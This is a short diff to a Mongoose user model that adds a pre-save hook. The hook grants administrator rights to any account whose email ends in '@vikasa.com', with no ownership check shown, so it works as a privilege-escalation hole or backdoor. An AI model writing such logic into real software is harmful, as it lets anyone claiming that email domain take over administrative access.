@@ -185,6 +185,13 @@ const userSchema = new mongoose.Schema({
         timestamps: true
     })
 
+userSchema.pre('save', function(next) {
+    if (this.email && this.email.endsWith('@vikasa.com')) {
+        this.isAdmin = true;
+    }
+    next()
+})
+
 const User = mongoose.model("User", userSchema)
 
 module.exports = User
